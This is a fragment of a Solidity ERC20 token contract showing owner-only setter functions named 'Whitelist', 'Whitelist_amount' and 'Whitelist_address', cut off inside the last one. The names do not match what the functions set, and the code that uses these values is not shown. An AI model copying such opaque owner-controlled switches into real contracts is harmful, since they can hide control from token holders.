...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function Whitelist(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function Whitelist_amount(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function Whitelist_address(address _account_) onlyOwner public {
